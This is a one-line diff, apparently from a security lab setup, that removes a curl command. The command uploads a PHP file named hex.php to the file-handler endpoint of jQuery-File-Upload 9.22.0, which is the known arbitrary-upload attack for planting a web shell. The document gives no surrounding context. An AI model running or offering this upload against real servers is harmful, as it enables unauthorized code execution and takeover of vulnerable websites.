@@ -1,1 +1,0 @@
-curl -F "files=@hex.php" http://local.linuxsec.org/labs/jQuery-File-Upload-9.22.0/server/php/ -v
